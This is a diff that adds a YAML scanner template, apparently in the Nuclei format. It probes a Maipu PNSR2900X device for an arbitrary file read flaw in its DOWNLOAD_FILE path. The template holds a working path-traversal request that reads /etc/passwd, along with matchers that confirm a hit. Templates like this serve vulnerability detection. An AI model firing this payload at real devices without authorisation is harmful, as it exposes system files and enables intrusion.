@@ -1,0 +1,29 @@
+id: poc-yaml-maipupnsr2900x-download-file-anyfile-read
+info:
+  name: 迈普pnsr2900x DOWNLOAD_FILE 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/DOWNLOAD_FILE/../../../../../../../../../../../../../../../../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: word
+        part: header
+        words:
+          - "filename=passwd"
